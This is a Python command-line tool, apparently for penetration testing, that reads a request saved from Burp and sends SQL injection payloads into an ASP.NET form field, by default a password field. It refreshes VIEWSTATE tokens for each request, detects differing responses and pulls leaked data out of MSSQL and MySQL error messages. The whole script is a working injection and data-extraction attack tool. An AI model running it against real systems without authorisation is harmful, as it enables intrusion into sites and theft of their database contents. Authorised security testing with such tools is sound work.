#!/usr/bin/env python3
"""
ASP.NET SQLi Tester — generic, request-file mode
Works on any ASP.NET target: Web Forms, MVC, Web API.
Handles VIEWSTATE/EVENTVALIDATION token refresh automatically.
Routes all traffic through Burp for full visibility.

Usage:
    python3 aspnet_sqli.py -r request.txt -p payloads.txt [options]

Save your request from Burp: right-click → Save item, or paste raw
HTTP request (including headers and body) into a .txt file.
"""

import argparse
import re
import sys
import time
import urllib.parse
import html as htmlmod
from dataclasses import dataclass, field
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ── Colours ───────────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"


# ── Raw request parser ────────────────────────────────────────────────────────
@dataclass
class ParsedRequest:
    method:  str
    path:    str
    host:    str
    scheme:  str
    headers: dict
    cookies: dict
    body:    str
    params:  dict   # decoded body params


def parse_request_file(path: str, scheme: str = "https") -> ParsedRequest:
    with open(path, "rb") as f:
        raw = f.read().decode("utf-8", errors="replace")

    raw = raw.replace("\r\n", "\n").replace("\r", "\n")
    head, body = (raw.split("\n\n", 1) + [""])[:2]

    lines = head.splitlines()
    parts = lines[0].strip().split()
    method = parts[0].upper()
    path   = parts[1] if len(parts) > 1 else "/"

    headers = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()

    host = headers.pop("Host", "")

    cookies = {}
    cookie_str = headers.pop("Cookie", "")
    for part in cookie_str.split(";"):
        part = part.strip()
        if "=" in part:
            k, v = part.split("=", 1)
            cookies[k.strip()] = v.strip()

    for auto in ("Content-Length", "Content-Type", "Connection"):
        headers.pop(auto, None)

    body = body.strip()
    params = {}
    if body:
        for kv in body.split("&"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                params[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)
            else:
                params[urllib.parse.unquote_plus(kv)] = ""

    return ParsedRequest(
        method=method, path=path, host=host, scheme=scheme,
        headers=headers, cookies=cookies, body=body, params=params,
    )


def full_url(req: ParsedRequest) -> str:
    return f"{req.scheme}://{req.host}{req.path}"


# ── Token extraction — configurable field names ───────────────────────────────
DEFAULT_TOKEN_FIELDS = [
    "__VIEWSTATE",
    "__EVENTVALIDATION",
    "__VIEWSTATEGENERATOR",
]

def extract_tokens(html_text: str, token_fields: list[str]) -> dict:
    tokens = {}
    for f in token_fields:
        # Try name before value, then value before name
        for pattern in [
            rf'<input[^>]+name=["\']?{re.escape(f)}["\']?[^>]+value=["\']([^"\']*)["\']',
            rf'<input[^>]+value=["\']([^"\']*)["\'][^>]+name=["\']?{re.escape(f)}["\']?',
        ]:
            m = re.search(pattern, html_text, re.IGNORECASE)
            if m:
                tokens[f] = m.group(1)
                break
    return tokens


def get_fresh_tokens(session: requests.Session,
                     req: ParsedRequest,
                     token_fields: list[str],
                     timeout: int,
                     verify: bool) -> Optional[dict]:
    try:
        r = session.get(
            full_url(req), headers=req.headers,
            timeout=timeout, verify=verify, allow_redirects=True,
        )
        tokens = extract_tokens(r.text, token_fields)
        if token_fields and not any(tokens.values()):
            print(yellow(f"[!] No tokens found in GET response — "
                         f"page may require auth or URL is wrong"))
            return None
        return tokens
    except requests.RequestException as e:
        print(red(f"[!] Token refresh GET failed: {e}"))
        return None


# ── Request builder ───────────────────────────────────────────────────────────
def build_body(base_params: dict,
               inject_param: str,
               payload: str,
               mirror_param: Optional[str] = None,
               overrides: Optional[dict] = None) -> dict:
    """
    Clone base params, apply static overrides, inject payload.
    Optionally mirrors payload into a second param (e.g. ConfirmPassword).
    """
    p = dict(base_params)
    if overrides:
        p.update(overrides)
    p[inject_param] = payload
    if mirror_param and mirror_param in p:
        p[mirror_param] = payload
    return p


# ── Hint extraction ───────────────────────────────────────────────────────────
def extract_hint(body: str) -> str:
    decoded = htmlmod.unescape(body)

    # Priority 1: MSSQL conversion error — contains extracted data
    m = re.search(
        r"Conversion failed when converting (?:the )?(?:nvarchar|varchar|"
        r"uniqueidentifier|datetime|ntext|text) value '([^']{1,500})' to data type",
        decoded, re.IGNORECASE
    )
    if m:
        return f"EXTRACTED: {m.group(1)}"

    # Priority 2: MySQL extraction pattern
    m = re.search(
        r"XPATH syntax error: '([^']{1,300})'",
        decoded, re.IGNORECASE
    )
    if m:
        return f"EXTRACTED(MySQL): {m.group(1)}"

    # Priority 3: Other actionable SQL errors
    m = re.search(
        r"(Incorrect syntax near|Unclosed quotation mark|"
        r"arithmetic overflow|Cannot convert|Invalid column name|"
        r"Invalid object name|ORA-\d{4,5}|"
        r"You have an error in your SQL syntax|"
        r"supplied argument is not a valid MySQL|"
        r"pg_query\(\)|PostgreSQL)[^\n<]{0,200}",
        decoded, re.IGNORECASE
    )
    if m:
        return m.group(0).strip()

    # Priority 4: Request validation (ASP.NET input filter — not SQLi)
    m = re.search(
        r"A potentially dangerous Request\.Form value",
        decoded, re.IGNORECASE
    )
    if m:
        return "[ASP.NET RequestValidation — encode payload or use --no-request-validation]"

    # Priority 5: Generic exception fallback
    m = re.search(
        r"(SqlException|OleDbException|HttpRequestValidationException)"
        r"[^\n<]{0,120}",
        decoded, re.IGNORECASE
    )
    if m:
        return f"[noise] {m.group(0).strip()}"

    return ""


# ── Single injection ──────────────────────────────────────────────────────────
def inject(session: requests.Session,
           req: ParsedRequest,
           params: dict,
           timeout: int,
           verify: bool) -> tuple[int, int, int, str, str]:
    try:
        t0 = time.time()
        r = session.request(
            method=req.method, url=full_url(req),
            headers=req.headers, data=params,
            timeout=timeout, verify=verify, allow_redirects=False,
        )
        elapsed = int((time.time() - t0) * 1000)
        hint = extract_hint(r.text) if r.status_code >= 400 else ""
        return r.status_code, len(r.content), elapsed, hint, r.text
    except requests.Timeout:
        return 0, 0, timeout * 1000, "TIMEOUT", ""
    except requests.RequestException as e:
        return 0, 0, 0, str(e), ""


# ── Baseline ──────────────────────────────────────────────────────────────────
def confirm_baseline(session, req, token_fields, baseline_string,
                     timeout, verify) -> Optional[tuple[int, int]]:
    print(bold("\n[*] Confirming baseline (original request, no injection)..."))
    tokens = get_fresh_tokens(session, req, token_fields, timeout, verify)
    if tokens is None:
        return None

    params = dict(req.params)
    params.update(tokens)

    try:
        t0 = time.time()
        r = session.request(
            method=req.method, url=full_url(req),
            headers=req.headers, data=params,
            timeout=timeout, verify=verify, allow_redirects=False,
        )
        elapsed = int((time.time() - t0) * 1000)
    except requests.RequestException as e:
        print(red(f"    [!] Baseline failed: {e}"))
        return None

    sc = r.status_code
    sz = len(r.content)
    sc_str = green(str(sc)) if sc < 400 else red(str(sc))
    print(f"    Status : {sc_str}  |  Size : {sz}b  |  Time : {elapsed}ms")

    if sc >= 500:
        print(red(
            "\n    [!] Baseline returned 500 — session cookies are likely expired.\n"
            "    [!] Re-save the request from Burp and rerun."
        ))
        return None

    if baseline_string and baseline_string not in r.text:
        print(yellow(
            f"\n    [!] Baseline string not found: '{baseline_string}'\n"
            "    [!] Update --baseline-string to text present in this response."
        ))
        # Don't abort — show what IS in the response to help pick a string
        snippet = r.text[:500].replace("\n", " ")
        print(yellow(f"    [!] Response preview: {snippet[:200]}"))
        return None

    label = f"'{baseline_string}'" if baseline_string else "HTTP response"
    print(green(f"    [+] Baseline confirmed — {label} present."))
    return sc, sz


# ── Main ──────────────────────────────────────────────────────────────────────
def run(args):
    proxy   = None if args.no_proxy else args.proxy
    proxies = {"http": proxy, "https": proxy} if proxy else {}
    scheme  = "http" if args.http else "https"

    # Parse token fields
    token_fields = [t.strip() for t in args.token_fields.split(",") if t.strip()] \
                   if args.token_fields else DEFAULT_TOKEN_FIELDS

    # Parse static overrides
    overrides = {}
    for kv in args.set_param:
        if "=" in kv:
            k, v = kv.split("=", 1)
            overrides[k] = v
        else:
            print(yellow(f"  [!] Ignoring malformed --set-param: {kv}"))

    print(bold(cyan("\n=== ASP.NET SQLi Tester ===")))

    req = parse_request_file(args.request, scheme=scheme)

    print(f"  Target       : {full_url(req)}")
    print(f"  Method       : {req.method}")
    print(f"  Inject param : {args.inject_param}")
    print(f"  Mirror param : {args.mirror_param or 'none'}")
    print(f"  Token fields : {token_fields}")
    print(f"  Payload file : {args.payloads}")
    print(f"  Proxy        : {proxy or 'none'}")
    if overrides:
        print(f"  Overrides    : {overrides}")

    if args.inject_param not in req.params:
        print(yellow(
            f"\n  [!] '{args.inject_param}' not in request body.\n"
            f"  [!] Available: {list(req.params.keys())}\n"
            f"  [!] Check spelling — use decoded names ($ not %24)."
        ))

    session = requests.Session()
    session.cookies.update(req.cookies)
    session.proxies.update(proxies)

    # Baseline
    baseline = confirm_baseline(
        session, req, token_fields,
        args.baseline_string, args.timeout, args.verify
    )
    if not baseline:
        sys.exit(1)
    baseline_status, baseline_size = baseline

    # Load payloads
    try:
        with open(args.payloads) as f:
            payloads = [
                ln.strip() for ln in f
                if ln.strip() and not ln.startswith("#")
            ]
    except FileNotFoundError:
        print(red(f"[!] Payload file not found: {args.payloads}"))
        sys.exit(1)

    # Warmup phase
    if args.warmup > 0:
        print(bold(f"\n[*] Warming up — {args.warmup} requests "
                   f"(payload: {repr(args.warmup_payload)})"))
        for w in range(1, args.warmup + 1):
            tokens = get_fresh_tokens(session, req, token_fields,
                                      args.timeout, args.verify)
            if not tokens:
                continue
            params = build_body(req.params, args.inject_param,
                                args.warmup_payload,
                                mirror_param=args.mirror_param,
                                overrides=overrides)
            params.update(tokens)
            sc, sz, ms, _, _ = inject(session, req, params,
                                      args.timeout, args.verify)
            sc_str = green(str(sc)) if sc < 400 else red(str(sc))
            delta = sz - baseline_size
            state = "ready" if (sz != baseline_size and ms < 5000) else "init"
            print(f"    warmup {w}/{args.warmup}  {sc_str}  {sz}b  "
                  f"{ms}ms  Δ{delta:+d}b  [{state}]")
            time.sleep(args.delay)
            if state == "ready":
                print(green("    [+] Server ready"))
                break
        print()

    # Payload loop
    print(bold(f"[*] Running {len(payloads)} payloads\n"))
    print(f"{'#':<5} {'Status':<8} {'Size':<9} {'Time(ms)':<10} "
          f"{'Result':<10} Payload")
    print("─" * 95)

    hits = []

    for i, payload in enumerate(payloads, 1):
        tokens = get_fresh_tokens(session, req, token_fields,
                                  args.timeout, args.verify)
        if not tokens:
            print(yellow(f"  [{i:03d}] Token refresh failed — skipping"))
            continue

        params = build_body(req.params, args.inject_param, payload,
                            mirror_param=args.mirror_param,
                            overrides=overrides)
        params.update(tokens)

        sc, sz, ms, hint, body = inject(session, req, params,
                                        args.timeout, args.verify)

        triggered  = (sc != baseline_status) or (sz != baseline_size)
        size_delta = sz - baseline_size
        result_str = red("HIT  ") if triggered else green("clean")
        sc_str     = red(str(sc)) if sc >= 400 else green(str(sc))
        delta_str  = f" Δ{size_delta:+d}b" if size_delta != 0 else ""
        display_pl = (payload[:55] + "…") if len(payload) > 55 else payload

        print(f"{i:<5} {sc_str:<17} {sz:<9} {ms:<10} "
              f"{result_str}  {display_pl}{delta_str}")

        if hint:
            print(f"       {yellow('└─ ' + hint)}")

        if triggered and args.dump:
            decoded = htmlmod.unescape(body)
            anchor  = max(0, decoded.find("Exception Details") - 100)
            if anchor == 0:
                anchor = max(0, decoded.find("Stack Trace") - 100)
            snippet = decoded[anchor:anchor + 3000]
            print(f"\n--- DUMP ---\n{snippet}\n---\n")

        if triggered:
            hits.append((i, payload, sc, sz, ms, hint))

        time.sleep(args.delay)

    # Summary
    print("\n" + "═" * 95)
    print(bold(f"[*] Complete — {len(hits)}/{len(payloads)} differentials\n"))

    if hits:
        print(bold(red(f"[!] HITS ({len(hits)}):\n")))
        for idx, pl, sc, sz, ms, hint in hits:
            print(f"  #{idx}  {sc} | {ms}ms | {sz}b")
            print(f"       Payload : {pl}")
            if hint:
                print(f"       Hint    : {hint}")
            print()
    else:
        print(green("[+] No differentials detected."))


# ── CLI ───────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="ASP.NET SQLi tester — generic, raw request file + Burp proxy",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Web Forms (default — VIEWSTATE refresh)
  python3 aspnet_sqli.py -r req.txt -p payloads.txt

  # Mirror payload into ConfirmPassword (registration forms)
  python3 aspnet_sqli.py -r req.txt -p payloads.txt \\
      --mirror-param "ctl00$MainContent$ConfirmPassword"

  # MVC / Web API — no viewstate tokens
  python3 aspnet_sqli.py -r req.txt -p payloads.txt --token-fields ""

  # Override a field for every request
  python3 aspnet_sqli.py -r req.txt -p payloads.txt \\
      --set-param "ctl00$MainContent$Email=safe@example.com"

  # No proxy, direct to target
  python3 aspnet_sqli.py -r req.txt -p payloads.txt --no-proxy

  # HTTP target
  python3 aspnet_sqli.py -r req.txt -p payloads.txt --http
        """
    )
    # Required
    ap.add_argument("-r", "--request",  required=True,
                    help="Raw HTTP request file (saved from Burp)")
    ap.add_argument("-p", "--payloads", required=True,
                    help="Payload file — one payload per line, # for comments")

    # Injection control
    ap.add_argument("--inject-param",
                    default="ctl00$MainContent$Password",
                    help="Body parameter to inject into")
    ap.add_argument("--mirror-param", default=None,
                    help="Copy payload into this param too (e.g. ConfirmPassword)")
    ap.add_argument("--set-param", metavar="KEY=VALUE", action="append",
                    default=[],
                    help="Override param for every request (repeatable)")

    # Detection
    ap.add_argument("--baseline-string", default="",
                    help="String expected in clean response for differential detection")

    # Token handling
    ap.add_argument("--token-fields",
                    default=",".join(DEFAULT_TOKEN_FIELDS),
                    help="Comma-separated hidden field names to refresh each request "
                         "(default: ASP.NET Web Forms fields). Pass empty string to disable.")

    # Warmup
    ap.add_argument("--warmup", type=int, default=0,
                    help="Requests to send before payload loop to exhaust "
                         "server-side init (default: 0)")
    ap.add_argument("--warmup-payload", default="warmup'",
                    help="Payload to use during warmup (default: warmup')")

    # Network
    ap.add_argument("--proxy",    default="http://127.0.0.1:8080",
                    help="Burp proxy (default: http://127.0.0.1:8080)")
    ap.add_argument("--no-proxy", action="store_true",
                    help="Send directly to target, bypass proxy")
    ap.add_argument("--http",     action="store_true",
                    help="Use http:// instead of https://")
    ap.add_argument("--verify",   action="store_true",
                    help="Enable SSL verification (off by default for Burp)")
    ap.add_argument("--timeout",  type=int, default=90,
                    help="Request timeout in seconds (default: 90)")
    ap.add_argument("--delay",    type=float, default=0.5,
                    help="Seconds between requests (default: 0.5)")

    # Output
    ap.add_argument("--dump", action="store_true",
                    help="Print response Exception Details section on every HIT")

    args = ap.parse_args()
    run(args)


if __name__ == "__main__":
    main()
